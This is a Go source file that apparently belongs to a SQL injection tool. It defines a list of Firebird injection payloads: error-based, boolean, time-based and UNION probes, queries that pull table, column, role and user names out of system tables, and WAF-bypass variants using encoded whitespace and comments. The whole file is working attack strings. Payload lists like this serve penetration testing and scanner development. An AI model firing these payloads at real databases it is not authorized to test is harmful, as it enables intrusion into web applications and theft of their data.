package payloads

var Firebird = PayloadGroup{
	DBMS: "Firebird",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST(CURRENT_USER AS INT)--"},
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST(CURRENT_ROLE AS INT)--"},
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST((SELECT RDB$DESCRIPTION FROM RDB$DATABASE) AS INT)--"},
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST((SELECT RDB$GET_CONTEXT('SYSTEM', 'DB_NAME') FROM RDB$DATABASE) AS INT)--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM RDB$DATABASE)=1--", Expected: "true"},

		// ═══════════════════════════════════════════
		// TIME-BASED (Firebird has no native sleep)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND EXISTS(SELECT 1 FROM RDB$FIELDS R1, RDB$FIELDS R2, RDB$FIELDS R3, RDB$FIELDS R4)--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1 FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION SELECT 1,2 FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3 FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL FROM RDB$DATABASE--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION (system tables)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$VIEW_BLR IS NULL--"},
		{Type: "deep", Content: "' UNION SELECT RDB$FIELD_NAME||':'||RDB$FIELD_SOURCE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='USERS'--"},
		{Type: "deep", Content: "' UNION SELECT RDB$ROLE_NAME FROM RDB$ROLES--"},
		{Type: "deep", Content: "' UNION SELECT RDB$USER FROM RDB$USER_PRIVILEGES--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_USER FROM RDB$DATABASE--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_ROLE FROM RDB$DATABASE--"},
		{Type: "deep", Content: "' UNION SELECT RDB$GET_CONTEXT('SYSTEM', 'DB_NAME') FROM RDB$DATABASE--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "1'%09OR%091=1--"},
		{Type: "bypass", Content: "1'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%0AOR%0A1%3D1--"},
		{Type: "bypass", Content: "'%09UNION%09SELECT%091%09FROM%09RDB$DATABASE--"},
		{Type: "bypass", Content: "'%0AAND%0A1%3D1--"},
		{Type: "time", Content: "' AND EXISTS(SELECT 1 FROM RDB$FIELDS R1, RDB$FIELDS R2, RDB$FIELDS R3)--"},
		{Type: "time", Content: "' AND EXISTS(SELECT 1 FROM RDB$RELATIONS R1, RDB$RELATIONS R2, RDB$RELATIONS R3)--"},
		{Type: "time", Content: "' AND EXISTS(SELECT 1 FROM RDB$FIELDS R1, RDB$FIELDS R2, RDB$FIELDS R3, RDB$FIELDS R4, RDB$FIELDS R5)--"},
		{Type: "union", Content: "' UNION SELECT NULL FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4 FROM RDB$DATABASE--"},
		{Type: "union", Content: "\" UNION SELECT 1,2 FROM RDB$DATABASE--"},
		{Type: "union", Content: "') UNION SELECT 1,2 FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION ALL SELECT 1,2,3 FROM RDB$DATABASE--"},
		{Type: "boolean", Content: "\" AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "\" AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR '1'='1", Expected: "true"},
		{Type: "boolean", Content: "' OR '1'='2", Expected: "false"},
		{Type: "boolean", Content: "' AND 1=1 AND '1'='1", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2 AND '1'='1", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM RDB$DATABASE)=1", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM RDB$DATABASE)=2", Expected: "false"},
		{Type: "error", Content: "' AND 1=CAST((SELECT RDB$CHARACTER_SET_NAME FROM RDB$CHARACTER_SETS WHERE RDB$CHARACTER_SET_ID=1) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT RDB$FIELD_NAME FROM RDB$FIELDS) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT RDB$RELATION_NAME FROM RDB$RELATIONS) AS INT)--"},
		{Type: "deep", Content: "' UNION SELECT RDB$TRIGGER_NAME||':'||RDB$TRIGGER_TYPE FROM RDB$TRIGGERS--"},
		{Type: "deep", Content: "' UNION SELECT RDB$FIELD_NAME FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='ADMIN'--"},
		{Type: "deep", Content: "' UNION SELECT RDB$CHARACTER_SET_NAME||':'||RDB$DEFAULT_COLLATE_NAME FROM RDB$CHARACTER_SETS--"},
		{Type: "deep", Content: "' UNION SELECT MON$USER FROM MON$ATTACHMENTS--"},
		{Type: "deep", Content: "' UNION SELECT RDB$DESCRIPTION FROM RDB$DATABASE--"},
	},
}

